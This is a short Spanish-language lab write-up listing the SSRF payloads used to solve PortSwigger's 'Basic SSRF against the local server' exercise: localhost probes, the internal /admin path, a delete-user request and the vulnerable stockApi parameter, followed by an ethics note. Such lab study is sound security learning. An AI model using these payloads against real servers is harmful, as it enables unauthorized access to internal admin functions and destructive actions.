# Payloads SSRF

## Laboratorio

* Plataforma: PortSwigger Web Security Academy
* Laboratorio: Basic SSRF against the local server
* Categoría: SSRF

---

## Localhost

Payload usado para probar si el servidor puede hacer peticiones hacia sí mismo.

```http
http://localhost/
```

```http
http://127.0.0.1/
```

---

## Panel interno

Payload usado para intentar acceder al panel administrativo interno del servidor.

```http
http://localhost/admin
```

---

## Acción administrativa del laboratorio

Payload usado para completar el laboratorio eliminando al usuario indicado por PortSwigger.

```http
http://127.0.0.1/admin/delete?username=carlos
```

---

## Parámetro vulnerable

El parámetro vulnerable fue:

```http
stockApi=
```

Por Ejemplo:

```http
stockApi= http://localhost/admin
```

---

## Nota ética

Estos payloads fueron usados únicamente en un entorno de laboratorio autorizado de PortSwigger Web Security Academy.
